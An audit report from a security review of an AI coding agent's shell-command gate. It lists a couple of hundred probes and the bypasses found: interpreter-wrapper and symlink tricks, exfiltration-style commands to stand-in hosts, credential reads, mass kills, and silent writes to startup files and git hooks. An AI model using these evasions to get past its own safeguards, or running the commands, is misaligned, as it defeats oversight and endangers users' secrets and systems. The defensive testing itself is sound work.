# WP2.1 G15b hunter A: shell and interpreter escape (find-only)

Hunter A, independent (did not write or review the code under test). Date 2026-10-23.
Companion data: `docs/wp2_1_g15b_hunter_A.tsv` (one row per probe, 267 rows, FAILED and
inconclusive probes included). Scratch (not repo files, kept for re-run):
`/data/data/com.termux/files/usr/tmp/g15b/A/{harness.py,probes.py,run_probes.py,out/raw.jsonl,out/controls.txt}`.
Nothing in the repo was modified except these two output files.

## Method

- Behavior baseline: `git archive 941ec3f` (full hash
  `941ec3fb076d97e6e0998c0ea98eee086e6b0915`) extracted to
  `/data/data/com.termux/files/usr/tmp/g15b/A/snap`. `sys.path` = snapshot only.
  Every python run used `python3 -I`, `env -i`, disposable `HOME`,
  `CODEY_STATE_DIR`, `CODEY_ACTION_GATEWAY_AUDIT` (all under `.../g15b/A`),
  no proxy vars, stdin `/dev/null`.
- Two real functions were called: `tools.shell_tools.classify_shell_command` and
  `tools.shell_tools.shell()` (the real gateway, `gate_exec`, `is_dangerous`, git-metadata
  scan), plus `core.task_executor.TaskExecutor._daemon_shell` (called unbound).
  Before any call, `subprocess.run/Popen/call/check_*`, `os.system/kill/killpg/exec*/spawn*/fork/popen`,
  `socket.connect`, `socket.create_connection` were replaced by recorders (`run` records argv and
  returns a fake result; the rest record and raise). `utils.logger.confirm` as bound in `shell_tools`
  was replaced by a recorder that declines, so "PROMPTED" means the real code asked a human.
  No dangerous binary was run. The only real subprocesses were four harmless controls
  (`echo`, `true`, `ls`, `tee` on a nonexistent path inside the scratch dir, `out/controls.txt`).
- Confirm-less mode was simulated by `AGENT_CONFIG["confirm_shell"]=False` and calling `shell(cmd)`
  (the `TOOLS["shell"]` lambda in `core/agent.py:394` never forwards `yolo`). Daemon: `_daemon_shell`,
  which calls `shell(command, yolo=True)`.
- Verdict rule: BYPASS = the real code path reached the recorded `subprocess.run` with no refusal and no
  prompt AND the recorded argv would perform the dangerous effect if run for real. "Would perform the
  effect" is my reading of the argv semantics, not an observed effect. OK = refused, prompted, or argv
  inert (literal). Severity is per the scope rubric 2.6 (HIGH needs confirm-less reach plus
  kill/exfil/credential/publish/irreversible/write-to-agent-or-evaluator; ambiguous rated higher; binary
  absent on this device rated LOW "latent", column `reachability_note` says so).

## Excluded foreign paths (not read as committed behavior)

`core/process_boundary.py`, `tools/shell_tools.py`, `tests/test_execution_recovery_gateway.py`,
`tests/test_shell_refusal_accounting.py`, `tests/test_shell_wrapper_boundaries.py`, and the modified and
untracked files under `.claude/`. All results are HEAD-snapshot only and may be superseded by the owner's
in-progress `shell_tools.py` diff (NEW-1012). I did read the working-tree copies of `docs/`,
`NEW_ISSUES.md` only for ledger cross-reference.

## Counts (267 probes)

BYPASS HIGH 134, BYPASS MEDIUM 25, BYPASS LOW 22, OK 84, INCONCLUSIVE 2.
Many HIGH rows are the same root cause repeated over targets (the F-* matrix is 12 targets x 4 tools);
the numbered findings below are the deduplicated view. HIGH counts are an upper bound under the rubric's
"ambiguous = higher" rule, not a count of proven exploits.

## Reachability (read from code, not exercised end to end)

Confirm-less (`confirm_shell=False`): `main.py:114` (`--yolo`), `main.py:2352` (`--fix`, also
`core/fixmode.py:62`), `core/tdd.py:128` (`--tdd`), `core/task_executor.py:397-399` (daemon: also
`shell(yolo=True)` via `_daemon_shell`), bench harness `bench/agents.py:31`
(`main.py <task> --yolo --no-resume`, cwd = bench workspace), CCOS `coding.run_agent` with
`confirm_shell=False` (`ccos/plugins/coding/agent/agent.py:71-135`, daemon path).
**Correction to the scope doc's mode list:** plain one-shot (`args.prompt` without `--chat`,
`main.py:2427`) only sets a display flag; I found no code that disables `confirm_shell` for it, so
one-shot WITHOUT `--yolo` still prompts for every ACT/HIGH command (per `shell()` line 714). I read
this, did not exercise it.

## Key structural fact discovered (changes severity of several seeds)

`shell()` prompts a human for any ACT command where `is_dangerous()` is true (basename in
`DANGEROUS_COMMANDS`: rm rmdir mkfs dd chmod wget curl mv cp, or a `DANGEROUS_PATTERNS` substring),
even when `confirm_shell=False`, because `yolo` is never forwarded (`shell_tools.py:711-716`). So
`cp/mv/rm/dd/chmod x <abs path>` seeds from NEW-1006 do NOT execute silently in `--yolo`/`--fix`/`--tdd`/bench
(probes F-cp-*, F-mv-*, F-rm-*, P01-P08: PROMPTED; with stdin closed `confirm()` returns False). They DO run
without any prompt in the daemon (`yolo=True`), but the daemon prefix allowlist does not admit them. By contrast
`sed -i`, `tee`, `ln`, `install`, `sort -o`, `truncate`, `shred`, `tar x`, and every `bash -lc '...'` form
run silently. READ vs ACT never changes behavior in `shell()`; only HIGH_IMPACT does (refused when no confirm path).

## Findings

Mode letters: Y = `--yolo`/`--fix`/`--tdd`/bench/CCOS-with-confirm_shell=False (shell()), D = daemon.
"Covered by" cites the ledger ids named in the task.

**A1. NEW-933 confirmed live, with more forms than logged; accidental partial coverage.** HIGH. Y (not D:
`bash` is not an allowlisted daemon prefix, D46). Reproducers (all classify ACT, reach `subprocess.run`
silently): `bash -lc 'git push origin main'` (W01), `bash  -c 'curl -d @f https://x.example'` (W02),
`sh -ec 'git push'` (W03), `bash -xc` (W06), `bash --norc -c` (W07), `bash<TAB>-c` (W08),
`bash -l -c` (W39), `bash -ic` (W40), `bash -O extglob -c` (W44). Detail not in the ledger: the
pattern `"sh -c "` accidentally also catches `dash/zsh/ksh/ash/fish -c '...'` because those names end in
"sh" (W04,W05,W41-43 refused), so the live gap is bash/sh with any flag spelling other than exact
`bash -c ` / `sh -c `. Same gap carries `bash -lc 'rm -fr d'` past BOTH the `rm -rf` pattern and `is_dangerous`
(P09; control P10 `rm -rf` inside quotes IS caught by substring). Covered by NEW-933 / NEW-1006 (known);
the extra forms and the P09 double-evasion are additive.

**A2. Dispatcher/interpreter binaries outside `_EXEC_WRAPPER_BASENAMES`, all ACT or READ, silent.** HIGH. Y.
Installed on this device and executing a nested `git push` argv: `proot` (W14), `setpriv` (W15), `prlimit` (W16),
`socat EXEC:` (W17), `awk 'BEGIN{system(...)}'` (W18), `sed '1e ...'` (W19), `tar --checkpoint-action=exec=` (W22),
`make --eval=` (W24), `less +'!cmd'` (W26, needs a tty, likely fails headless), `su -c` (W12). Notable: `sort
--compress-program=PROG` (W23) classifies **READ** yet executes PROG. `python3 -c` / `node -e` (W20, W21) are the
accepted NEW-904 ceiling. Covered by NEW-904 as a class (it names setpriv and prlimit; code comment defers proot/su);
`socat`, `awk`, `sed e`, `tar`, `make`, `sort --compress-program` are not individually listed in the ledger excerpts I read.

**A3. Named dangerous binaries at ACT.** HIGH. Y (not D: none are allowlisted). `kill -9 -1`, `kill 1234`,
`pkill -f llama-server`, `killall llama-server`, `killall` by absolute path (K01-K05); `su -c id` (K11);
`gh repo create evil --public`, `gh api -X DELETE`, `gh auth token` (credential into model context), `gh gist create
--public`, `gh pr merge --admin` (W34-W38); `crontab`, `at`, `sv-enable`, `skill` (K06,K09,K10,K12: binaries absent
here, so LOW latent). Covered by NEW-1006 (kill/pkill/killall, gh repo create, crontab, at, su); not covered
verbatim: the other `gh` verbs (`auth token`, `api -X DELETE`, `pr merge`, `gist`), `skill`, `sv-enable`.

**A4. Credentialed egress/publishing ecosystem not in any set.** HIGH. Y. `gcloud storage cp ~/.ssh/id_rsa gs://...`
(X01), `gcloud auth print-access-token` (X03), `gcloud compute instances delete` (X04), `bq rm -f -r` (X05): `gcloud/gsutil/bq`
are on PATH via `~/google-cloud-sdk/bin`. `gsutil -m rm -r` is refused only by the accidental `rm -r ` substring (X02). Also
`npm publish` (X06), `cargo publish` (X07), `cloudflared tunnel --url http://localhost:8765` (X08, exposes a local service),
`ssh-copy-id` (W30, uploads key to a remote), `socat FILE:... TCP:host` (W31), `openssl s_client -connect` (W32), DNS/ICMP
channels `nslookup`, `dig`, `ping -p` (X09-X11, MEDIUM), `xdg-open URL` (X13, MEDIUM), `ssh-agent` (X12). NEW-1006 does not
list any of these; the group-9 `_NETWORK_CLIENT_BASENAMES` set stops at curl/wget/scp/rsync/ssh/sftp/ftp/telnet/nc*.
Effects (real upload/delete) not exercised, credentials' presence on this device not checked.

**A5. Device actions outside the `termux-*` family.** HIGH by ambiguity rule (actual effect depends on Android
permissions I did not test). Y. `am start -a android.intent.action.CALL -d tel:...` (T01), `am start ... SENDTO smsto:` (T03),
`am broadcast` (T02), `cmd package uninstall`, `pm uninstall`, `settings put`, `svc wifi disable`, `input text`
(T04-T08, MEDIUM). `termux-sms-send` and the `termux-api` libexec path are correctly refused (T09, T10). Not covered by any cited id.

**A6. Silent writes to startup files, agent code, evaluator files, `.git` via non-prompting tools.** HIGH. Y.
`sed -i`, `ln -sf` (replaces target by symlink), `sort -o` (a READ-class writer), `install -m755`, `tee` (empty stdin truncates),
`truncate -s 0`, `shred -u`, `tar xf x.tar -C $HOME` against `$HOME/.bashrc`, `$HOME/.termux/boot/s.sh`, `$HOME/.gitconfig`,
`$HOME/.ssh/authorized_keys`, `<root>/core/agent.py`, `main.py`, `bench/suite.lock`, `bench/lock.py`, `codey-start`,
`lib/service_lifecycle.sh`, `install.sh`, and a sibling repo's `.git/hooks/pre-commit` (the 12-target F-* matrix: all EXEC).
Git-metadata scan (`_shell_command_targets_git_metadata`) works for workspace/CODE_DIR `.git` with plain-argv writes
(G03,G04,G06,G07,G09,G10 refused) but: roots are only `WORKSPACE_ROOT` and `CODE_DIR`, so sibling-repo `.git/hooks`,
`~/.gitconfig`, `~/.config/git/config` (hooksPath, aliases, `core.sshCommand`) are unscanned (G11-G13 EXEC); script-embedded and
attached-option writes are unscanned (G01 `sed -n 'w .git/config'`, G02 `sort -o.git/config`, G05 awk redirect, G15 `bash -lc 'echo >> .git/hooks/x'`,
G16 `python3 -c open(...)`), of which G01/G02/G05 are DOCUMENTED residuals in the function's own docstring. Covers NEW-1006
(partially: its seeds listed cp/mv/rm which actually prompt, see Key fact), NEW-1008 for bench (suite.lock not shown to be
detected: not tested by me, hunter B owns it). Whether `bench/lock.py` detects these edits: NOT TESTED.

**A7. Basename-only classification defeated by a two-step rename/symlink.** HIGH. Y. `ln -s /usr/bin/curl c` (N03, silent
ACT) then `./c -d @f https://x.example` (N02, ACT silent); same for git: `ln -s .../git g` (N04) then `./g push origin main`
(N01). `classify_shell_command` keys only on `Path(argv[0]).name`; a symlink or copy under any other name escapes every
named-binary set and the git env isolation (`shell_git_environment`). The classifier's own comment lists the argv[0]-only
blind spot for wrappers (NEW-875/NEW-904); this concrete two-step form with the two silent stages is not recorded.
Needs workspace write (normal for the agent). Not exercised past classification.

**A8. Secret reads are READ with no policy, including in the daemon.** HIGH under the ambiguity rule; policy is
unstated, so listed for Ish. Y and D. `cat $HOME/.ssh/id_rsa`, `cat $HOME/.netrc`, `grep -r token $HOME/.config`, `printenv`,
bare `env` (R01-R05, D27-D29): classified READ, run silently, output goes to the model context. `env` and `printenv` and
`cat` are explicit daemon prefixes. Only leaves the device if the backend is remote (scope doc 2.7; not tested here).
No cited finding covers it.

**A9. Daemon `_DANGEROUS_FLAGS` is a substring test on single-dash letters; combined flags dodge it.** HIGH
marginal. D. `python3 -Ic '...'` (D14), `-Bc` (D15), `-Ec` (D48), `-Wc` (D49) pass; `-Im http.server` (D16, MEDIUM)
passes. Plain `-c`, `-I -c`, `python3.11 -c`, `python3<TAB>-c`, `python  -c`, `pythonw` are blocked (D17-D19,D41,D42,D44,D47).
Because `python3 x.py`, `pytest`, and `pip install <url>` are allowlisted by design (D20-D25: arbitrary code and network
fetch), this adds no capability beyond the accepted NEW-904 ceiling, but it defeats the control the function's docstring
claims. `_DANGEROUS_FLAGS` is applied only to the python/pip branch, so `pytest -p evil_plugin`, `pytest -c cfg` pass with no
flag filter (D24,D25). Distinct defect from NEW-1007 (prefix boundary) in the same function; not in any cited id.

**A10. NEW-1007 confirmed, LOW.** D. `lsof`, `lsattr`, `pwdx` ran (binaries present); `lsblk`, `catdoc`, `envsubst`,
`echo2`, `grepjar`, `findmnt`, `pytestx`, `whichever`, `printenvx` were admitted but binary absent here (D01-D12). `cdx` blocked (prefix is `cd `).
Each admitted binary still goes through `classify_shell_command`, so a named HIGH binary is never admitted this way. No
dangerous binary beginning with an allowlisted prefix found on this device. Matches NEW-1007 as logged.

**A11. Self-launch and lifecycle scripts at ACT, silent.** MEDIUM (HIGH if `codey-stop`'s kill of the live daemon/models
counts as a non-owned kill; I rated it owned/restartable). Y. `python3 main.py --yolo`, `codeyOS --yolo --allow-self-mod`
(`~/Codey-OS` is on PATH), `python3 bench/lock.py`, `./codey-start`, `codey-stop`, `bash <repo>/codey-stop` (H01-H04, K07, K08);
`pytest -p evil_plugin` (H05). Covered by scope doc 2.7(e)/(f); NEW-904 for the opaque part.

**A12. Audit label inaccuracies, LOW.** An arbitrary executable named like a READ command (`./ls`, N05) is labelled READ
and skips the git-metadata argv scan; `sort -o`, `uniq in out`, `tree -o` are READ writers. Audit-label only because READ and
ACT behave identically in `shell()`.

## Negative results (control present in the TSV)

HIGH_IMPACT correctly refused in confirm-less and daemon: `bash -c 'git push'` and `sh -c` with the exact pattern (W09,W10),
`env <args>` (W11,W51,D30), `busybox sh -c` (W13), `xargs`, `find -exec` (W28,W29,D32), `nohup` (W50), every `git*` (D31),
`termux-*` (T09,T10), `rsync` (F-rsyncloc), `cu''rl`, `c\url`, `"git" push` (shlex-normalized, classifier and exec agree: N06-N08),
`git/` (N13), `sed -i`/`tee`/`ln` touching plain-argv `.git/**` under workspace/CODE_DIR (G03,G04,G06,G07,G09,G10). `rm -fr`,
`rm -f -r`, `rm --recursive`, `dd of=`, `chmod -R` classify ACT (pattern evasion) but are PROMPTED, so no silent effect (P01-P08).
No shell semantics without an interpreter, confirmed by real harmless controls (`out/controls.txt`): `~`, `>>`, `$(...)`, `$HOME`,
glob, `;` are literal argv (F-literal-*, N16-N19, D34-D36, D40); `FOO=bar cmd` and `LD_PRELOAD=x cmd` raise ENOENT (N11,N12);
NBSP is not shlex whitespace (N09); embedded NUL in the git scan fails closed to HIGH_IMPACT (N10, D45); unbalanced quote
is not executed (N14). Daemon: `bash -lc`, `python3 -m` plain, `pip uninstall`, `pipx install`, leading-space `rm -rf` blocked (D33,D38,D39,D46).

## What I could NOT test

- Real effects of any command (all runs were recorder fakes). Whether Termux grants `CALL_PHONE`/SMS via `am`, whether `gh`/`gcloud`
  hold credentials here, whether `su` is usable.
- A real interactive prompt: modeled by a declining recorder. NEW-996 says real `^C` does not interrupt `input()` here; not exercised.
- The write_file/`Filesystem` side (symlink created by `ln` then written through, `python3 script.py` after write_file): hunter B.
- Whether `bench/lock.py`/`suite.lock` detect a shell-ACT edit (NEW-1008): hunter B, and enabling the bench is forbidden (NEW-761).
- One-shot-without-`--yolo` runtime behavior, CCOS executor end-to-end, and the bench harness end-to-end (reachability by reading code).
- G14 (`sed -i` on the real `Codey-OS/.git/config`) is inconclusive: in my harness `CODE_DIR` is the snapshot, so the real repo is
  outside scan roots; in production the repo's own `.git` is inside `CODE_DIR`.
- Whether daemon-reachable bash exists through some other allowlisted prefix: none found in 50 daemon probes, not a proof.
- Interactions with the foreign uncommitted `shell_tools.py` diff; re-run `run_probes.py` against whatever the owner commits.

## Suggested handling for the coordinator

Highest value for G15c beyond NEW-1006's list: interpreter `-c` detection by argv (A1); a decision on `gh`/`gcloud`/`gsutil`/`bq`/`npm publish`/
`cargo publish`/`cloudflared`/`socat`/`ssh-copy-id`/`am`/`cmd`/`pm` as named families (A3-A5); a write-path scan for silent writers against
home startup files and the six roots (A6, Ish F3); basename-spoof two-step (A7, likely belongs in the F2 ceiling decision); a policy call on
secret reads (A8); `_DANGEROUS_FLAGS` combined-flag fix (A9). The IDs are for the coordinator to allocate.
